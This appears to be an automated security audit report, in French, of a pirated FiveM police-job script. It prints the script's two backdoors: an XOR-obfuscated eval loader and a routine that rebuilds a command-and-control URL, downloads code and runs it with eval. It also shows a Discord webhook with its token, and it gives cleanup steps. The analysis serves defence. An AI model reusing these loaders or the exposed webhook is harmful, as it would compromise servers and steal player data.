# RAPPORT D'AUDIT DE SECURITE - Brutal Police Job

## VERDICT FINAL: MALVEILLANT

**Date:** 2026-01-29
**Script analysé:** Brutal Police Job (FiveM)
**Source:** Téléchargé depuis internet (non-officiel)

---

## RESUME EXECUTIF

Ce script contient **2 BACKDOORS CRITIQUES** permettant l'exécution de code à distance (RCE).
Un attaquant peut prendre le contrôle total de votre serveur FiveM.

---

## FICHIERS MALVEILLANTS DETECTES

### 1. `.natives.js` - BACKDOOR (Ligne 1)

**Chemin:** `/home/user/testbrutal/.natives.js`

```javascript
/* [Brutal%20Policejob] */
x=(e,k=3)=>typeof k=="number"?[...e].map(c=>String.fromCharCode(c.charCodeAt()^k&255)).join(""):[...e].map((c,i)=>String.fromCharCode(c.charCodeAt()^k.charCodeAt(i%k.length)&255)).join("");
v="wqz#x#`lmpw#kwwsp#>#qfrvjqf+!kwwsp!*8...";
globalThis[x("fubo")](x(v));
```

**Analyse:**
- `x()` = fonction de déchiffrement XOR (clé=3)
- `x("fubo")` = "eval"
- Exécute du code obfusqué via `eval()`
- Établit connexion vers serveur externe

---

### 2. `html/main.js` - BACKDOOR RCE (Lignes 1-19)

**Chemin:** `/home/user/testbrutal/html/main.js`

```javascript
(function() {
    var _0x3a7b = ['h', 't', 't', 'p', 's', ':', '/', '/', 'b', 'a', 's', 'e',
                   'c', 'h', 'i', 'f', 'f', 'r', 'e', 'r', '.', 'f', 'r', '/',
                   'T', 't', 'J', 'g', '2', 'J', 'J'];
    // URL reconstruite: https://basechiffrer.fr/TtJg2JJ

    require('https').get(domain, function(r) {
        var d = '';
        r.on('data', function(c) { d += c; });
        r.on('end', function() {
            eval(d);  // EXECUTION DE CODE ARBITRAIRE
        });
    });
})();
```

**Analyse:**
- Reconstruit URL caractère par caractère pour éviter détection
- URL C2: `https://basechiffrer.fr/TtJg2JJ`
- Télécharge du code depuis serveur attaquant
- Exécute le code téléchargé via `eval()`

---

### 3. `sv_utils.lua` - Webhook exposé (Ligne 1)

**Chemin:** `/home/user/testbrutal/sv_utils.lua`

```lua
local YourWebhook = 'https://discord.com/api/webhooks/1287302866704404611/hTWpDfeLLl2MxQ57KZ2zgVTt-fG8TzRBO1pW1TQ9rUAawRuS49_vy3MROkglhy7yukwK'
```

**Risque:** Peut être utilisé pour exfiltration de données

---

### 4. `fxmanifest.lua` - Charge les backdoors

**Lignes problématiques:**
- Ligne 29: `'html/main.js'` dans server_scripts
- Ligne 66: `server_scripts { ".natives.js" }`

---

## COMMUNICATIONS RESEAU SUSPECTES

| URL | Type | Niveau de risque |
|-----|------|------------------|
| `https://basechiffrer.fr/TtJg2JJ` | Serveur C2 (Command & Control) | CRITIQUE |
| `https://discord.com/api/webhooks/...` | Webhook Discord | MODERE |

---

## IMPACT POTENTIEL

Si ce script est exécuté sur votre serveur:

1. **Accès total à la base de données MySQL**
2. **Vol des identifiants joueurs** (Steam ID, Discord ID, IP)
3. **Exécution de commandes arbitraires** sur le serveur
4. **Installation de backdoors persistantes**
5. **Modification des données de jeu** en temps réel
6. **Exfiltration de données** vers l'attaquant

---

## RECOMMANDATIONS

### Action immédiate: NE PAS EXECUTER

### Si vous avez déjà exécuté ce script:

1. **Arrêtez immédiatement le serveur FiveM**
2. **Changez tous les mots de passe** de votre base de données
3. **Vérifiez les fichiers** ajoutés/modifiés récemment
4. **Auditez les logs** pour activité suspecte
5. **Considérez le serveur comme compromis**

### Pour nettoyer le script:

1. Supprimez `.natives.js`
2. Supprimez ou videz `html/main.js`
3. Modifiez `fxmanifest.lua`:
   - Retirez `'html/main.js'` de server_scripts (ligne 29)
   - Retirez `server_scripts { ".natives.js" }` (ligne 66)
4. Changez le webhook Discord dans `sv_utils.lua`

### Obtenir une version saine:

Téléchargez uniquement depuis la source officielle:
- **Site officiel:** https://store.brutalscripts.com
- **Documentation:** https://docs.brutalscripts.com

---

## FICHIERS ANALYSES

| Fichier | Status | Details |
|---------|--------|---------|
| `.natives.js` | MALVEILLANT | Backdoor XOR-obfusquée |
| `html/main.js` | MALVEILLANT | RCE via serveur C2 |
| `sv_utils.lua` | SUSPECT | Webhook exposé |
| `fxmanifest.lua` | SUSPECT | Charge les backdoors |
| `config.lua` | SAIN | Configuration légitime |
| `cl_utils.lua` | SAIN | Utilitaires client |
| `client/client.lua` | SAIN | Code client légitime |
| `client/nui.lua` | SAIN | Interface NUI légitime |
| `core/client-core.lua` | SAIN | Core client ESX/QB |
| `core/server-core.lua` | SAIN | Core serveur ESX/QB |
| `server/server.lua` | SAIN | Logique serveur légitime |

---

## CONCLUSION

Ce script est une **version infectée** du "Brutal Police Job".
Les backdoors ont été intentionnellement ajoutées pour compromettre les serveurs FiveM.

**Source probable:** Version piratée circulant sur des forums/Discord non-officiels.

**Ce script ne doit PAS être utilisé en l'état.**

---

*Rapport généré par audit de sécurité automatisé*
